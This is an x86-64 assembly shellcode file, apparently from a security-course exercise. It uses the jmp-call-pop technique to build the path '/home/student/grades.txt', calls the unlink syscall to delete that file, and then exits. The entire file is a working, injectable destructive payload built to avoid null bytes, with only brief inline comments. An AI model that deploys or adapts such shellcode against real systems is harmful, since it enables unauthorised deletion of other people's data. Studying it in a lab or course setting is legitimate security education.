#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	24
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+8)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
  	popq    %rdi                /* Pop address of STRING into RDI (arg 1 for unlink) */
	
	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    %al,(STRLEN)(%rdi)  /* Null-terminate the string at the correct length */
	
	movb    $SYS_unlink,%al     /* Set up syscall (unlink) in RAX */

	syscall				/* invoke syscall */

	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    $SYS_exit,%al		/* set up the syscall number */
	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
